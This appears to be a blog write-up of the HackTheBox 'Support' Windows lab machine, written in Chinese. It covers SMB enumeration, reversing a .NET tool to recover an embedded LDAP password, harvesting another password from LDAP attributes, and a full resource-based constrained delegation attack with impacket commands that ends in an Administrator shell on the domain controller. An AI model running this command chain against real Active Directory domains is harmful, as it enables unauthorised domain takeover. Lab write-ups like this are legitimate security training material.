---
layout: post
title: "HackTheBox - Support"
date: 2026-03-25
category: "Security Practice｜HackTheBox｜Windows Machines"
tags: []
draft: false
toc: true
comments: true
---

# HackTheBox - Support
<!-- more -->

## Port Scanning
```bash
nmap -sC -sV -Pn 10.129.230.181
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-25 02:13 CST
Nmap scan report for 10.129.230.181
Host is up (0.20s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-24 18:14:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/25%Time=69C2D486%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-03-24T18:16:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 343.86 seconds
```

## 開SMB進去撈資料
```bash
$ smbclient -L //10.129.230.181 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
$ smbclient //10.129.230.181/support-tools -N
smb: \> get UserInfo.exe.zip
smb: \> exit
```
解壓縮後發現`UserInfo.exe`是.NET寫的
```bash
$ file UserInfo.exe
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

## 逆向
```csharp
using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
```
得到加密的密碼，解密後是，但我們還不知道這是誰麼密碼，可以用password spraing的方式處理，當然也可以繼續看一下dnSpy中的LdapQuery
```csharp
using System;
using System.DirectoryServices;

namespace UserInfo.Services
{
	// Token: 0x02000007 RID: 7
	internal class LdapQuery
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00002190 File Offset: 0x00000390
		public LdapQuery()
		{
			string password = Protected.getPassword();
			this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
			this.entry.AuthenticationType = AuthenticationTypes.Secure;
			this.ds = new DirectorySearcher(this.entry);
		}
...
```

* Username: `ldap`
* Password: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

## 確認權限
```bash
$ crackmapexec smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.129.230.181  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
$ evil-winrm -i 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> dir

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```
是個低權限的foothold，那就要想辦法拿到更多credentials
* Kerberoasting
    ```bash
    $ GetUserSPNs.py support.htb/ldap:'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -request
    Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

    No entries found!
    ```
* ldapsearch

    ```bash
    ldapsearch -x -H ldap://10.129.230.181 \
    -D "support\\ldap" \
    -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
    -b "dc=support,dc=htb" \
    "(objectClass=user)" \
    sAMAccountName description info
    # extended LDIF
    #
    # LDAPv3
    # base <dc=support,dc=htb> with scope subtree
    # filter: (objectClass=user)
    # requesting: sAMAccountName description info
    #

    # Administrator, Users, support.htb
    dn: CN=Administrator,CN=Users,DC=support,DC=htb
    description: Built-in account for administering the computer/domain
    sAMAccountName: Administrator

    # Guest, Users, support.htb
    dn: CN=Guest,CN=Users,DC=support,DC=htb
    description: Built-in account for guest access to the computer/domain
    sAMAccountName: Guest

    # DC, Domain Controllers, support.htb
    dn: CN=DC,OU=Domain Controllers,DC=support,DC=htb
    sAMAccountName: DC$

    # krbtgt, Users, support.htb
    dn: CN=krbtgt,CN=Users,DC=support,DC=htb
    description: Key Distribution Center Service Account
    sAMAccountName: krbtgt

    # ldap, Users, support.htb
    dn: CN=ldap,CN=Users,DC=support,DC=htb
    sAMAccountName: ldap

    # support, Users, support.htb
    dn: CN=support,CN=Users,DC=support,DC=htb
    info: Ironside47pleasure40Watchful
    sAMAccountName: support

    # smith.rosario, Users, support.htb
    dn: CN=smith.rosario,CN=Users,DC=support,DC=htb
    sAMAccountName: smith.rosario

    # hernandez.stanley, Users, support.htb
    dn: CN=hernandez.stanley,CN=Users,DC=support,DC=htb
    sAMAccountName: hernandez.stanley

    # wilson.shelby, Users, support.htb
    dn: CN=wilson.shelby,CN=Users,DC=support,DC=htb
    sAMAccountName: wilson.shelby

    # anderson.damian, Users, support.htb
    dn: CN=anderson.damian,CN=Users,DC=support,DC=htb
    sAMAccountName: anderson.damian

    # thomas.raphael, Users, support.htb
    dn: CN=thomas.raphael,CN=Users,DC=support,DC=htb
    sAMAccountName: thomas.raphael

    # levine.leopoldo, Users, support.htb
    dn: CN=levine.leopoldo,CN=Users,DC=support,DC=htb
    sAMAccountName: levine.leopoldo

    # raven.clifton, Users, support.htb
    dn: CN=raven.clifton,CN=Users,DC=support,DC=htb
    sAMAccountName: raven.clifton

    # bardot.mary, Users, support.htb
    dn: CN=bardot.mary,CN=Users,DC=support,DC=htb
    sAMAccountName: bardot.mary

    # cromwell.gerard, Users, support.htb
    dn: CN=cromwell.gerard,CN=Users,DC=support,DC=htb
    sAMAccountName: cromwell.gerard

    # monroe.david, Users, support.htb
    dn: CN=monroe.david,CN=Users,DC=support,DC=htb
    sAMAccountName: monroe.david

    # west.laura, Users, support.htb
    dn: CN=west.laura,CN=Users,DC=support,DC=htb
    sAMAccountName: west.laura

    # langley.lucy, Users, support.htb
    dn: CN=langley.lucy,CN=Users,DC=support,DC=htb
    sAMAccountName: langley.lucy

    # daughtler.mabel, Users, support.htb
    dn: CN=daughtler.mabel,CN=Users,DC=support,DC=htb
    sAMAccountName: daughtler.mabel

    # stoll.rachelle, Users, support.htb
    dn: CN=stoll.rachelle,CN=Users,DC=support,DC=htb
    sAMAccountName: stoll.rachelle

    # ford.victoria, Users, support.htb
    dn: CN=ford.victoria,CN=Users,DC=support,DC=htb
    sAMAccountName: ford.victoria

    # search reference
    ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

    # search reference
    ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

    # search reference
    ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

    # search result
    search: 2
    result: 0 Success

    # numResponses: 25
    # numEntries: 21
    # numReferences: 3
    $ crackmapexec smb 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
    SMB         10.129.230.181  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
    SMB         10.129.230.181  445    DC               [+] support.htb\support:Ironside47pleasure40Watchful
    ```

取得另外一個credential
* Username: `support`
* Password: `Ironside47pleasure40Watchful`

## 提權
沒什麼想法的時候就看bloodhound
<img src="/assets/posts/HackTheBox/Support - 1.png">

從上面的圖可以看得出來support是這個 group 成員，而這個 group 對 DC（電腦物件）有 GenericAll，也就是可以「完全控制 Domain Controller 的 computer object」
```bash
support → MemberOf → SHARED SUPPORT ACCOUNTS → GenericAll → DC.support.htb
```

### RBCD(Resource-Based Constrained Delegation)
以下的cmd都在kali中完成，當然也要修改`/etc/hosts`或者`/etc/resolv.conf`
```bash
$ impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' -dc-ip 10.129.230.181 -computer-name FAKE$ -computer-pass Pass123!
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account FAKE$ with password Pass123!.
$ impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' -dc-ip 10.129.230.181 -action write -delegate-from FAKE$ -delegate-to DC$
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKE$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKE$        (S-1-5-21-1677581083-3380853377-188903654-6101)
$ impacket-getST support.htb/FAKE$:'Pass123!' -dc-ip 10.129.230.181 -spn cifs/DC.support.htb -impersonate Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
$ export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
$ impacket-psexec support.htb/Administrator@DC.support.htb -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file rpSIKzVu.exe
[*] Opening SVCManager on DC.support.htb.....
[*] Creating service rFXF on DC.support.htb.....
[*] Starting service rFXF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
5d4c5b8e8247a12f62995ab61e02200b
```